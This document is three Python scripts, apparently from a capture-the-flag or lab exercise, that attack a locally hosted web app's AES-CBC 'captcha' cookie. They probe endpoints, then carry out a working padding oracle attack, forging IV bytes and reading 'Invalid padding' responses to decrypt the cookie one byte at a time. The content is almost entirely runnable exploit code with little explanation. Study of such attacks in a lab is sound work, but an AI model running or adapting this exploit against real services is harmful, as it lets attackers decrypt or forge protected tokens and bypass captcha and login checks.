import requests
import base64
import re

base_url = "http://127.0.0.1:33002"

session = requests.Session()

# First, get the homepage to see the form and any instructions
resp = session.get(f"{base_url}/")
print(f"[GET] / Status: {resp.status_code}")
print(f"Content length: {len(resp.text)}")

# Check the cookies we received from the provided context
# captcha value: hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0=
# Let's manually add this cookie to test
captcha_val = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_val)

print(f"\n[+] Using captcha: {captcha_val}")
print(f"[+] Ciphertext length: {len(ciphertext)} bytes")
print(f"[+] Ciphertext hex: {ciphertext.hex()}")

# Split into blocks (AES block size is 16 bytes)
BLOCK_SIZE = 16
num_blocks = len(ciphertext) // BLOCK_SIZE
print(f"[+] Number of blocks: {num_blocks}")
for i in range(num_blocks):
    block = ciphertext[i*BLOCK_SIZE:(i+1)*BLOCK_SIZE]
    print(f"    Block {i}: {block.hex()}")

# Try accessing an endpoint that might decrypt captcha
# Common patterns: /verify, /validate, /check, /submit
test_paths = ['/verify', '/validate', '/check', '/submit', '/api/verify', '/api/captcha']
for path in test_paths:
    try:
        resp = session.get(f"{base_url}{path}")
        print(f"\n[GET] {path}: {resp.status_code}")
        if resp.status_code != 404:
            print(f"Content: {resp.text[:500]}")
    except Exception as e:
        pass


import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

# Padding Oracle test function
def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Test if the modified captcha cookie triggers "Invalid padding" error.
    Returns: True if padding is valid, False if invalid padding, None if other error
    """
    # Set the modified captcha cookie
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'test_oracle',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        
        # Check for "Invalid padding" in response
        if "Invalid padding" in resp.text:
            return False  # Invalid padding
        elif "Internal Server Error" in resp.text:
            return None  # Some other server error
        else:
            # Any other response likely means valid padding
            return True
    except Exception as e:
        return None

# Main padding oracle attack
session = requests.Session()

# Get a fresh CSRF token
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
if csrf_match:
    csrf_token = csrf_match.group(1)
else:
    csrf_token = ""

# Use the provided captcha cookie
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)

# Structure: IV (block 0) || Ciphertext (block 1)
# We have 2 blocks total
iv = ciphertext[:BLOCK_SIZE]
block1 = ciphertext[BLOCK_SIZE:]

print(f"Original IV: {iv.hex()}")
print(f"Original Block1: {block1.hex()}")

# To decrypt Block1, we try all 256 values for the last byte of IV
# Expected padding for last byte: 0x01
print("\n[*] Starting padding oracle attack on last byte...")
print("[*] This may take a while...")

plaintext = bytearray(BLOCK_SIZE)

# For each position from last to first
for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
    padding_value = BLOCK_SIZE - byte_pos
    print(f"\n[*] Decrypting byte position {byte_pos} (expecting padding value 0x{padding_value:02x})")
    
    found = False
    for test_val in range(256):
        # Create modified IV
        modified_iv = bytearray(iv)
        
        # For already decrypted bytes, XOR them with padding_value
        for i in range(byte_pos + 1, BLOCK_SIZE):
            modified_iv[i] = iv[i] ^ plaintext[i] ^ padding_value
        
        # XOR the test byte
        modified_iv[byte_pos] = iv[byte_pos] ^ test_val ^ padding_value
        
        # Create modified ciphertext
        modified_cipher = bytes(modified_iv) + block1
        modified_b64 = base64.b64encode(modified_cipher).decode()
        
        # Test oracle
        result = test_oracle(session, modified_b64, csrf_token)
        
        if result is True:
            # Valid padding found!
            plaintext[byte_pos] = test_val
            print(f"[+] Byte {byte_pos} = 0x{test_val:02x} ({chr(test_val) if 32 <= test_val < 127 else '?'})")
            found = True
            break
        
        if test_val % 50 == 0:
            print(f"Progress: {test_val}/256 attempts...")
    
    if not found:
        print(f"[-] Could not decrypt byte {byte_pos}")
        break

print(f"\n[+] Decrypted plaintext: {plaintext.hex()}")
print(f"[+] Decrypted text: {plaintext.decode('utf-8', errors='replace')}")


import requests
import base64
import re
import time

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Test if the modified captcha cookie triggers oracle.
    Returns response text for analysis.
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        return resp.text
    except Exception as e:
        return f"Error: {e}"

# Get CSRF token
session = requests.Session()
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Use the provided captcha
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)
iv = bytearray(ciphertext[:BLOCK_SIZE])
block1 = ciphertext[BLOCK_SIZE:]

print(f"Original IV: {iv.hex()}")
print(f"Original Block1: {block1.hex()}")

# Let's test the oracle with a few values to understand response patterns
print("\n[*] Testing oracle with different inputs...")

# Test 1: Original ciphertext
resp1 = test_oracle(session, captcha_b64, csrf_token)
print(f"Original captcha response: {resp1[:200]}...")

# Test 2: Modified last byte
modified_iv = bytearray(iv)
modified_iv[15] ^= 0xFF
modified_cipher = bytes(modified_iv) + block1
modified_b64 = base64.b64encode(modified_cipher).decode()
resp2 = test_oracle(session, modified_b64, csrf_token)
print(f"Modified captcha response: {resp2[:200]}...")

# Check the exact differences
print(f"\nOriginal contains 'Invalid padding': {'Invalid padding' in resp1}")
print(f"Modified contains 'Invalid padding': {'Invalid padding' in resp2}")
print(f"Original contains 'wrong': {'wrong' in resp1.lower()}")
print(f"Modified contains 'wrong': {'wrong' in resp2.lower()}")
print(f"Original length: {len(resp1)}")
print(f"Modified length: {len(resp2)}")

